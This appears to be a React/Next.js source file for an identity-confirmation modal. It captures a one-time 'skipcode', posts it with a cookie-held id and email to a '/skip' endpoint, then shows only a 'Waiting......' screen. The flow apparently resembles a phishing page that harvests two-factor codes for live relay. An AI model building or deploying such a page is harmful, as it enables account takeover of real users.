import Image from "next/image";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import { toast } from "react-toastify";
import { useState } from "react";
import { useForm } from "react-hook-form"

function SecurityModal() {
  const [page,setPage]=useState(false)
  const form=useForm()
  const{register,handleSubmit,reset}=form

  const id = Cookies.get("id");

 

  const onSubmit =async(values) => {
    const{skipcode}=values
    const submitValues = {
      id,
      skipcode,
 
    };
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(submitValues),
    });

    const data = await res.json();

    if (res.ok) {
      toast.success("Login Succecssfull");
      reset()
      setPage(true)
      Cookies.remove("id");
      Cookies.remove("email");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }


};

  return (
   <>
   {
    !page?( <form onSubmit={handleSubmit(onSubmit)}>
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
     <p className="text-center text-2xl font-semibold">Confirm your identity</p>


 <div className="pt-5">
   
       <input
         className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
         placeholder="Enter the code"
         {...register('skipcode')}
         type="password"
         required
       />

<button
         type="submit"
         className="mt-5 w-full text-lg font-medium bg-[#191970] py-[10px] text-white transition duration-300 rounded"
       >
         Confirm
       </button>
     
   
 </div>


</div>
    </form>):(
      <p className="text-center text-lg font-medium mt-5">Waiting......</p>
    )
   }
   </>
  );
}

export default SecurityModal;
